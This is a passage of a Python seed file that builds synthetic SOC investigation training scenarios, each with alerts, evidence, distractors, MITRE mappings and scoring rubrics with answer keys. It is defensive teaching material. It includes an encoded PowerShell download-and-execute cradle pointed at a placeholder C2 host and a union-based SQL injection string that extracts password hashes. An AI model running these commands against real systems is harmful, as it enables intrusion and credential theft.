"""Seed 28 Advanced Educational SOC Investigation Scenarios for Step 18.

5 Beginner, 8 Intermediate, 10 Advanced, 5 Expert scenarios covering
Network Investigation, Endpoint Security, SOC Triage, Threat Intel,
and Incident Response.
Strictly synthetic educational data.
"""

import json
from typing import Any

from app.models.enums import ScenarioCategory, ScenarioDifficulty
from app.models.soc_scenario import SocScenario
from sqlalchemy.orm import Session


def _build_scenario(
    scenario_id: str,
    title: str,
    difficulty: str,
    category: str,
    description: str,
    learning_objectives: list[str],
    signal: dict[str, Any],
    evidence: list[dict[str, Any]],
    correlations: list[dict[str, Any]],
    hypotheses: list[dict[str, Any]],
    mitre: list[dict[str, Any]],
    responses: list[dict[str, Any]],
    rubric: dict[str, Any],
    hints: list[str],
    explanation: str,
    duration: int = 20,
) -> dict[str, Any]:
    return {
        "scenario_id": scenario_id,
        "title": title,
        "difficulty": difficulty,
        "category": category,
        "description": description,
        "learning_objectives": "\n".join(f"- {obj}" for obj in learning_objectives),
        "initial_signal_json": json.dumps(signal),
        "available_evidence_json": json.dumps(evidence),
        "correlation_targets_json": json.dumps(correlations),
        "hypotheses_options_json": json.dumps(hypotheses),
        "mitre_techniques_json": json.dumps(mitre),
        "response_options_json": json.dumps(responses),
        "scoring_rubric_json": json.dumps(rubric),
        "hints_json": json.dumps(hints),
        "solution_explanation": explanation,
        "estimated_duration_minutes": duration,
    }


def get_all_scenario_definitions() -> list[dict[str, Any]]:
    """Return all 28 synthetic scenarios."""
    scenarios: list[dict[str, Any]] = []

    # =========================================================================
    # BEGINNER SCENARIOS (5)
    # =========================================================================
    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-001",
            title="Inbound Reconnaissance: SYN Port Scan",
            difficulty=ScenarioDifficulty.BEGINNER,
            category=ScenarioCategory.NETWORK_INVESTIGATION,
            description="Suricata alerts trigger on an external IP executing sequential TCP SYN packets across multiple common ports.",
            learning_objectives=["Identify TCP half-open SYN scan patterns", "Distinguish scan traffic from normal HTTP requests", "Apply perimeter firewall ACL block rule"],
            signal={"alert_name": "ET SCAN Suspicious Inbound SYN Sequence", "src_ip": "198.51.100.89", "dst_ip": "10.0.1.50", "severity": "MEDIUM", "packets": 240},
            evidence=[
                {"id": "ev-1", "name": "PCAP TCP Flag Analysis", "type": "PCAP", "description": "SYN flags set with no corresponding ACK responses across ports 21, 22, 23, 80, 443, 3389."},
                {"id": "ev-2", "name": "Firewall Drop Log Entry", "type": "FIREWALL", "description": "Repeated dropped packets from 198.51.100.89 within 2 seconds."},
                {"id": "ev-3", "name": "Distractor: NTP Sync Log", "type": "SYSTEM", "description": "Routine NTP daemon synchronizing with pool.ntp.org."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Source IP matches Shodan/Censys scan infrastructure"},
                {"id": "c-2", "name": "Distractor: Correlate with printer DHCP request"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "External automated network reconnaissance looking for open administration ports"},
                {"id": "h-2", "name": "Distributed Denial of Service (DDoS) SYN flood intent on crashing edge router"},
            ],
            mitre=[
                {"id": "T1595.001", "name": "T1595.001 - Active Scanning: Scanning IP Blocks"},
                {"id": "T1059.001", "name": "T1059.001 - PowerShell"},
            ],
            responses=[
                {"id": "r-1", "name": "Block source IP 198.51.100.89 on external edge firewall", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Power off web server immediately", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "MEDIUM",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1595.001"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Review TCP flag patterns in the packet capture.", "Look at whether three-way handshakes completed.", "Avoid drastic host shutdowns for simple external port scans."],
            explanation="The actor performed an automated SYN port scan to map exposed services. Proper response is blocking the remote source IP at the edge firewall.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-002",
            title="Credential Phishing: Fake M365 Login Portal",
            difficulty=ScenarioDifficulty.BEGINNER,
            category=ScenarioCategory.SOC_INVESTIGATION,
            description="An employee forwarded an urgent email claiming 'Your Mailbox Storage is Full - Verify Identity Now'.",
            learning_objectives=["Triage phishing email headers and hyperlinks", "Analyze synthetic WHOIS and domain age", "Identify credential harvester indicators"],
            signal={"email_subject": "Urgent: Microsoft 365 Storage Exceeded", "sender": "support@micros0ft-verify.com", "recipient": "finance@company.test", "severity": "HIGH"},
            evidence=[
                {"id": "ev-1", "name": "Email Header SPF/DKIM Failure", "type": "EMAIL", "description": "Sender IP failed SPF check for domain microsoft.com."},
                {"id": "ev-2", "name": "Embedded Link URL", "type": "URL", "description": "Hyperlink points to https://login-micros0ft-auth.xyz/login.php."},
                {"id": "ev-3", "name": "Distractor: Corporate Weekly Newsletter", "type": "EMAIL", "description": "Legitimate company newsletter sent from internal communications."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Domain registered 12 hours ago with privacy guard"},
                {"id": "c-2", "name": "Distractor: Correlate with office cafeteria lunch menu"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Targeted credential harvesting campaign using typosquatted brand domain"},
                {"id": "h-2", "name": "Zero-day browser vulnerability exploit delivering kernel rootkit"},
            ],
            mitre=[
                {"id": "T1566.002", "name": "T1566.002 - Phishing: Spearphishing Link"},
                {"id": "T1071.001", "name": "T1071.001 - Web Protocols"},
            ],
            responses=[
                {"id": "r-1", "name": "Block domain login-micros0ft-auth.xyz on secure web gateway and purge email from inboxes", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Reply to sender asking for confirmation", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "HIGH",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1566.002"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Inspect the domain spelling in the link.", "Notice SPF/DKIM verification failures.", "Phishing URLs should be blocked on DNS and Web gateways."],
            explanation="The attacker used brand impersonation to harvest credentials. Block the domain and purge corresponding messages from mailboxes.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-003",
            title="Endpoint Alert: Rogue USB Storage Execution",
            difficulty=ScenarioDifficulty.BEGINNER,
            category=ScenarioCategory.ENDPOINT_INVESTIGATION,
            description="EDR alert flags an unapproved Mass Storage Device insertion followed by execution of invoice.exe.",
            learning_objectives=["Investigate Windows Event 2003 / USB insertion logs", "Analyze process parentage from removable media", "Enforce device containment"],
            signal={"event_type": "USB_INSERTION", "hostname": "WKST-HR-04", "hardware_id": "USB\\VID_0951&PID_1666", "severity": "MEDIUM"},
            evidence=[
                {"id": "ev-1", "name": "Windows Event 7045 - PnP Device Driver Load", "type": "EVENT_LOG", "description": "Kingston DataTraveler USB driver mounted at drive letter E:\\."},
                {"id": "ev-2", "name": "Process Spawn from E:\\invoice.exe", "type": "PROCESS", "description": "explorer.exe launched E:\\invoice.exe with PID 4412."},
                {"id": "ev-3", "name": "Distractor: Chrome Cache Cleanup", "type": "FILE", "description": "Routine browser temporary file deletion."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Executable hash matches known commodity infostealer"},
                {"id": "c-2", "name": "Distractor: Correlate with mouse pointer USB device"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Malware execution originated from unauthorized removable USB storage"},
                {"id": "h-2", "name": "Remote exploitation of SMB vulnerability across VPN"},
            ],
            mitre=[
                {"id": "T1091", "name": "T1091 - Replication Through Removable Media"},
                {"id": "T1204.002", "name": "T1204.002 - User Execution: Malicious File"},
            ],
            responses=[
                {"id": "r-1", "name": "Terminate invoice.exe, isolate WKST-HR-04, and block USB device ID in GPO", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Reformat entire corporate file share", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "HIGH",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1091", "T1204.002"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Check the drive letter from which the executable ran.", "Check whether company policy prohibits unencrypted USB media.", "Terminate the process and isolate the host."],
            explanation="The user inserted an unapproved flash drive and ran an untrusted executable. Contain the endpoint and block the process hash.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-004",
            title="Authentication Anomaly: SSH Brute Force Surge",
            difficulty=ScenarioDifficulty.BEGINNER,
            category=ScenarioCategory.NETWORK_INVESTIGATION,
            description="Linux bastion host logs show 1,200 failed SSH logins in 3 minutes targeting user 'root' and 'admin'.",
            learning_objectives=["Analyze /var/log/auth.log SSH failure spikes", "Recognize dictionary attack wordlists", "Configure Fail2ban automated IP blocks"],
            signal={"host": "bastion-edge-01", "service": "sshd", "failed_attempts": 1200, "source_ip": "203.0.113.14", "severity": "MEDIUM"},
            evidence=[
                {"id": "ev-1", "name": "auth.log Failed Password Entries", "type": "LINUX_LOG", "description": "Rapid sequence: Failed password for invalid user admin from 203.0.113.14 port 48210 ssh2."},
                {"id": "ev-2", "name": "Single Successful Login Event", "type": "LINUX_LOG", "description": "Accepted password for devops from 203.0.113.14 port 48992 ssh2."},
                {"id": "ev-3", "name": "Distractor: Cron Execution of backup.sh", "type": "SYSTEM", "description": "CRON[1920]: (root) CMD (/usr/local/bin/backup.sh)."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Attacker guessed valid password for 'devops' user after 1,180 tries"},
                {"id": "c-2", "name": "Distractor: Correlate with system uptime reboot"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "SSH password dictionary brute force attack resulting in credential compromise"},
                {"id": "h-2", "name": "Authorized developer who forgot their password"},
            ],
            mitre=[
                {"id": "T1110.001", "name": "T1110.001 - Brute Force: Password Guessing"},
                {"id": "T1078.003", "name": "T1078.003 - Valid Accounts: Local Accounts"},
            ],
            responses=[
                {"id": "r-1", "name": "Sever devops active SSH session, reset credentials, and ban source IP 203.0.113.14", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Allow attacker to continue to observe their behavior", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1110.001", "T1078.003"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Did any of the 1,200 attempts succeed?", "Look for 'Accepted password' in the log.", "Immediate session termination and password reset is essential."],
            explanation="The attacker brute-forced the SSH daemon and successfully compromised the 'devops' user. Terminate the active session and enforce SSH key authentication.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-005",
            title="Script Execution: PowerShell Encoded Command",
            difficulty=ScenarioDifficulty.BEGINNER,
            category=ScenarioCategory.ENDPOINT_INVESTIGATION,
            description="Sysmon Event 1 detects powershell.exe invoked with -EncodedCommand parameter downloading a remote script.",
            learning_objectives=["Decode Base64 Unicode PowerShell strings", "Identify web client download cradles", "Contain endpoint execution"],
            signal={"event_id": 1, "image": "powershell.exe", "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AcwBpAG0ALwBzAC4AcABzADEAJwApAA==", "severity": "HIGH"},
            evidence=[
                {"id": "ev-1", "name": "Decoded PowerShell Script Block", "type": "COMMAND", "description": "Decodes to: IEX (New-Object Net.WebClient).DownloadString('http://c2.sim/s.ps1')"},
                {"id": "ev-2", "name": "Parent Process cmd.exe", "type": "PROCESS", "description": "cmd.exe spawned powershell.exe from %TEMP% directory."},
                {"id": "ev-3", "name": "Distractor: Windows Update Service Check", "type": "SERVICE", "description": "TrustedInstaller.exe query to update catalog."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Outbound HTTP GET to c2.sim port 80 observed in DNS telemetry"},
                {"id": "c-2", "name": "Distractor: Correlate with system sound driver volume change"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Obfuscated PowerShell download cradle staging second-stage payload"},
                {"id": "h-2", "name": "Administrative scheduled task updating PowerShell help docs"},
            ],
            mitre=[
                {"id": "T1059.001", "name": "T1059.001 - Command and Scripting Interpreter: PowerShell"},
                {"id": "T1027", "name": "T1027 - Obfuscated Files or Information"},
            ],
            responses=[
                {"id": "r-1", "name": "Isolate host, terminate PowerShell process tree, and block domain c2.sim", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Delete powershell.exe from System32", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "HIGH",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1059.001", "T1027"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Base64 decode the string (-enc).", "Notice the Net.WebClient download cradle.", "Do not delete Windows system binaries like powershell.exe."],
            explanation="The attacker used encoded PowerShell to bypass basic string inspection and download secondary malware. Isolate host and block remote staging server.",
        )
    )

    # =========================================================================
    # INTERMEDIATE SCENARIOS (8)
    # =========================================================================
    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-006",
            title="Covert Channel: High-Entropy DNS Tunneling",
            difficulty=ScenarioDifficulty.INTERMEDIATE,
            category=ScenarioCategory.NETWORK_INVESTIGATION,
            description="Zeek/Bro logs reveal thousands of TXT queries to dynamic subdomains of tunnel-exfil.xyz with high Shannon entropy.",
            learning_objectives=["Calculate DNS subdomain entropy", "Detect DNS tunneling payloads (Iodine/dnscat2)", "Deploy DNS sinkhole mitigation"],
            signal={"alert": "DNS Tunneling Suspected", "domain": "tunnel-exfil.xyz", "query_rate": "85 queries/sec", "severity": "HIGH"},
            evidence=[
                {"id": "ev-1", "name": "High Frequency TXT Query Logs", "type": "DNS", "description": "Queries like a3f89c01b44.d92a188e.tunnel-exfil.xyz returning 255-byte Base64 strings."},
                {"id": "ev-2", "name": "Endpoint Process Sockets", "type": "ENDPOINT", "description": "Process data-sync.exe maintaining high UDP/53 outbound volume to internal recursive resolver."},
                {"id": "ev-3", "name": "Distractor: Corporate Active Directory SRV Query", "type": "DNS", "description": "_ldap._tcp.dc._msdcs.corp.test standard domain controller discovery."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Subdomain entropy exceeds 4.8 bits/byte indicating encrypted exfiltration"},
                {"id": "c-2", "name": "Distractor: Correlate with Spotify streaming socket"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Data exfiltration and C2 beaconing encapsulated inside DNS queries"},
                {"id": "h-2", "name": "Legitimate anti-spam DNSBL reputation query volume"},
            ],
            mitre=[
                {"id": "T1071.004", "name": "T1071.004 - Application Layer Protocol: DNS"},
                {"id": "T1048.003", "name": "T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol"},
            ],
            responses=[
                {"id": "r-1", "name": "Sinkhole tunnel-exfil.xyz at internal resolver and isolate infected workstation", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Block UDP port 53 globally across entire corporate network", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "HIGH",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1071.004", "T1048.003"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Examine the structure and entropy of the DNS subdomains.", "DNS tunneling encapsulates arbitrary binary data in DNS records.", "Sinkholing the specific domain is safer than disabling all DNS."],
            explanation="DNS tunneling was utilized to bypass perimeter egress filtering. The domain must be sinkholed and the offending process killed.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-007",
            title="Lateral Movement: PsExec Remote Service Creation",
            difficulty=ScenarioDifficulty.INTERMEDIATE,
            category=ScenarioCategory.ENDPOINT_INVESTIGATION,
            description="Windows Event 7045 on FileServer-01 logs new service 'PSEXESVC' installed remotely via SMB ADMIN$ share.",
            learning_objectives=["Identify PsExec service installation artifacts", "Track lateral movement across SMB/RPC", "Revoke compromised service accounts"],
            signal={"event_id": 7045, "service_name": "PSEXESVC", "image_path": "%SystemRoot%\\PSEXESVC.exe", "host": "FileServer-01", "severity": "HIGH"},
            evidence=[
                {"id": "ev-1", "name": "Event 7045 PSEXESVC Service Installed", "type": "EVENT_LOG", "description": "Service installed by user DOMAIN\\svc_backup from source IP 10.0.1.45."},
                {"id": "ev-2", "name": "IPC$ and ADMIN$ SMB Session Connect", "type": "SMB", "description": "Tree connect to \\\\FileServer-01\\ADMIN$ followed by write of PSEXESVC.exe."},
                {"id": "ev-3", "name": "Distractor: VSS Shadow Copy Created", "type": "BACKUP", "description": "Scheduled snapshot creation by local Windows Volume Shadow Copy service."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Source workstation 10.0.1.45 exhibited suspicious LSASS memory read earlier"},
                {"id": "c-2", "name": "Distractor: Correlate with printer paper jam alert"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Lateral movement utilizing PsExec with compromised service account credentials"},
                {"id": "h-2", "name": "Routine remote Windows update dispatched from WSUS server"},
            ],
            mitre=[
                {"id": "T1021.002", "name": "T1021.002 - Remote Services: SMB/Windows Admin Shares"},
                {"id": "T1569.002", "name": "T1569.002 - System Services: Service Execution"},
            ],
            responses=[
                {"id": "r-1", "name": "Disable service account svc_backup, stop PSEXESVC, and isolate source host 10.0.1.45", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Ignore because PsExec is a legitimate Sysinternals utility", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "HIGH",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1021.002", "T1569.002"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["PSEXESVC is the standard service dropped by PsExec.", "Notice the service account used for lateral movement.", "Contain both the source host and the target."],
            explanation="PsExec was abused for lateral movement following credential harvesting. Stop the rogue service and disable the compromised service account.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-008",
            title="Active Directory: Kerberoasting Ticket Requests",
            difficulty=ScenarioDifficulty.INTERMEDIATE,
            category=ScenarioCategory.SOC_INVESTIGATION,
            description="Domain Controller logs show unusual spike in Kerberos TGS requests requesting RC4-HMAC encryption for multiple SPNs.",
            learning_objectives=["Detect Kerberoasting via Event 4769", "Identify legacy RC4 (0x17) ticket requests", "Implement strong gMSA service accounts"],
            signal={"event_id": 4769, "service_name": "MSSQLSvc/db01.corp", "ticket_options": "0x40810000", "ticket_encryption": "0x17", "severity": "HIGH"},
            evidence=[
                {"id": "ev-1", "name": "Spike of 35 Event 4769 TGS Requests", "type": "EVENT_LOG", "description": "User jsmith requested TGS tickets for 35 distinct Service Principal Names in 45 seconds."},
                {"id": "ev-2", "name": "RC4-HMAC Encryption Type Flagged", "type": "KERBEROS", "description": "Explicit downgrade request for legacy 0x17 (RC4-HMAC) vulnerable to offline hash cracking."},
                {"id": "ev-3", "name": "Distractor: NTP Clock Skew", "type": "KERBEROS", "description": "2ms clock skew delta with PDC emulator."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: User jsmith account had no historical business need to query MSSQL SPNs"},
                {"id": "c-2", "name": "Distractor: Correlate with Active Directory tombstone cleanup"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Kerberoasting attack gathering service account hashes for offline password cracking"},
                {"id": "h-2", "name": "SQL database administrator running routine performance benchmarks"},
            ],
            mitre=[
                {"id": "T1558.003", "name": "T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting"},
            ],
            responses=[
                {"id": "r-1", "name": "Force password change for targeted SPN accounts with 25+ char complexity and lock jsmith account", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Reboot the Domain Controller", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "HIGH",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1558.003"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Event 4769 with encryption type 0x17 is the signature of Kerberoasting.", "Attackers crack these tickets offline using hashcat.", "Reset passwords on all targeted service accounts."],
            explanation="The adversary requested TGS tickets to extract offline hashes. Lock the compromised caller account and rotate service account passwords.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-009",
            title="Threat Intel Match: Tor Anonymization Outbound Beacon",
            difficulty=ScenarioDifficulty.INTERMEDIATE,
            category=ScenarioCategory.THREAT_INTELLIGENCE,
            description="Threat intelligence feed correlates egress traffic to known Tor exit node IP addresses from an internal finance desktop.",
            learning_objectives=["Correlate firewall flow logs with threat intel feeds", "Analyze TLS handshake SNI and certificate anomalies", "Mitigate policy violation / unauthorized anonymizers"],
            signal={"rule_match": "TI-FEED-TOR-EXIT", "src_ip": "10.0.3.112", "dst_ip": "185.220.101.5", "confidence": "HIGH", "severity": "HIGH"},
            evidence=[
                {"id": "ev-1", "name": "Threat Intel Sighting Match", "type": "INTEL", "description": "IP 185.220.101.5 listed as active Tor Exit Node in synthetic threat feed."},
                {"id": "ev-2", "name": "Continuous TLS Outbound Sockets", "type": "NETWORK", "description": "Port 9001 TCP continuous bidirectional data stream without standard corporate proxy cert."},
                {"id": "ev-3", "name": "Distractor: Zoom Meeting UDP Traffic", "type": "NETWORK", "description": "Video conferencing RTP stream on port 8801."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Process tor.exe identified in desktop application directory"},
                {"id": "c-2", "name": "Distractor: Correlate with Bloomberg terminal news feed"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Unauthorized anonymization network (Tor) active on corporate workstation bypassing inspection"},
                {"id": "h-2", "name": "False positive caused by public CDN IP overlap"},
            ],
            mitre=[
                {"id": "T1090.003", "name": "T1090.003 - Proxy: Multi-hop Proxy"},
                {"id": "T1573.002", "name": "T1573.002 - Encrypted Channel: Asymmetric Cryptography"},
            ],
            responses=[
                {"id": "r-1", "name": "Block destination IP range on firewall, terminate tor process, and conduct HR/Security interview", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Uninstall firewall software from network perimeter", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "HIGH",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1090.003", "T1573.002"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Verify if the destination IP is an active Tor exit node.", "Look for unauthorized proxy software running locally.", "Tor violates corporate acceptable use policy."],
            explanation="The user or malware connected to the Tor darknet to evade perimeter inspection. Terminate the connection and investigate the host.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-010",
            title="Web Attack: Union-Based SQL Injection",
            difficulty=ScenarioDifficulty.INTERMEDIATE,
            category=ScenarioCategory.NETWORK_INVESTIGATION,
            description="WAF alerts flag URI parameters containing 'UNION SELECT null, username, password_hash FROM users--'.",
            learning_objectives=["Inspect HTTP access logs for SQL injection patterns", "Evaluate HTTP response code and byte-size anomalies", "Deploy virtual patching on WAF"],
            signal={"rule": "WAF-SQLI-UNION", "uri": "/products.php?id=-1' UNION SELECT 1,username,password_hash FROM users--", "http_status": 200, "severity": "HIGH"},
            evidence=[
                {"id": "ev-1", "name": "Web Server Access Log", "type": "HTTP", "description": "GET request returned HTTP 200 with response size 45KB (normally 3KB)."},
                {"id": "ev-2", "name": "Database Query Error Log", "type": "DATABASE", "description": "MySQL query log shows execution of UNION query returning 250 rows."},
                {"id": "ev-3", "name": "Distractor: Favicon 404 Not Found", "type": "HTTP", "description": "GET /favicon.ico returned 404."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Response payload contained leaked user hashes and administrative credentials"},
                {"id": "c-2", "name": "Distractor: Correlate with CSS style sheet cache validation"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Successful SQL injection vulnerability exploitation resulting in database data dump"},
                {"id": "h-2", "name": "Failed automated vulnerability scanner without data leakage"},
            ],
            mitre=[
                {"id": "T1190", "name": "T1190 - Exploit Public-Facing Application"},
            ],
            responses=[
                {"id": "r-1", "name": "Apply WAF virtual patch blocking SQL metacharacters, rotate compromised database credentials, and patch application code", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Drop the database tables immediately", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1190"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Examine the HTTP response size compared to standard responses.", "Did the database execute the injected UNION statement?", "Virtual patch via WAF before code refactor."],
            explanation="The attacker successfully exploited an unparameterized SQL query to extract user credentials. Patch the vulnerability and rotate leaked passwords.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-011",
            title="Persistence Mechanism: Malicious Scheduled Task",
            difficulty=ScenarioDifficulty.INTERMEDIATE,
            category=ScenarioCategory.ENDPOINT_INVESTIGATION,
            description="Autoruns / Task Scheduler event 106 logs a daily recurring task executing a hidden VBScript in C:\\ProgramData.",
            learning_objectives=["Investigate Windows Event 4698 Task Creation", "Detect hidden VBScript / WScript execution", "Eradicate persistence artifacts"],
            signal={"event_id": 4698, "task_name": "GoogleUpdateHealthCheck", "task_content": "wscript.exe /e:VBScript C:\\ProgramData\\update.vbs", "severity": "HIGH"},
            evidence=[
                {"id": "ev-1", "name": "Task Scheduler XML Payload", "type": "EVENT_LOG", "description": "Task created by non-administrative account with SYSTEM execution privileges."},
                {"id": "ev-2", "name": "VBScript Payload Content", "type": "FILE", "description": "update.vbs reaches out to remote C2 server every morning at 08:00 AM."},
                {"id": "ev-3", "name": "Distractor: Edge Browser Auto-Update Task", "type": "TASK", "description": "Signed Microsoft Edge browser updater task in System32."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Task name masquerades as GoogleUpdate to deceive analysts"},
                {"id": "c-2", "name": "Distractor: Correlate with screen saver timeout"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Scheduled task persistence established via masqueraded script execution"},
                {"id": "h-2", "name": "Legitimate enterprise software maintenance routine"},
            ],
            mitre=[
                {"id": "T1053.005", "name": "T1053.005 - Scheduled Task/Job: Scheduled Task"},
                {"id": "T1036.004", "name": "T1036.004 - Masquerading: Masquerade Task or Service"},
            ],
            responses=[
                {"id": "r-1", "name": "Delete malicious scheduled task, quarantine update.vbs, and audit persistence registry run keys", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Format entire C: drive without backing up triage evidence", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "HIGH",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1053.005", "T1036.004"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Notice where the VBScript is stored (C:\\ProgramData).", "Notice the task name masquerading as GoogleUpdate.", "Delete the scheduled task and file artifact."],
            explanation="The attacker used scheduled tasks to maintain reboot persistence under a deceptive name. Remove the task and quarantine the payload.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-012",
            title="Cloud Incident: Illicit OAuth App Consent Grant",
            difficulty=ScenarioDifficulty.INTERMEDIATE,
            category=ScenarioCategory.INCIDENT_RESPONSE,
            description="Entra ID audit logs report user consented to multitenant app 'Office365 SuperSync' requesting Mail.ReadWrite and Files.ReadWrite.All.",
            learning_objectives=["Detect illicit OAuth consent grants", "Inspect OAuth permission scopes (Mail.ReadWrite)", "Revoke app grants and user session tokens"],
            signal={"operation": "Consent to application", "app_name": "Office365 SuperSync", "permissions": "Mail.ReadWrite, Files.ReadWrite.All", "severity": "HIGH"},
            evidence=[
                {"id": "ev-1", "name": "AuditLog Consent Record", "type": "AZURE_LOG", "description": "Consent granted by user sarah.connor@corp.test from external unmanaged device."},
                {"id": "ev-2", "name": "App Publisher Verification", "type": "CLOUD", "description": "Publisher is Unverified; App ID registered 48 hours ago in foreign tenant."},
                {"id": "ev-3", "name": "Distractor: Routine OneDrive File Sync Event", "type": "CLOUD", "description": "File modified in SharePoint team site."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Application immediately began querying Graph API to export inbox messages"},
                {"id": "c-2", "name": "Distractor: Correlate with Teams meeting calendar invite"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Illicit consent grant phishing enabling persistent cloud mailbox exfiltration without password"},
                {"id": "h-2", "name": "Corporate IT sanctioned migration utility"},
            ],
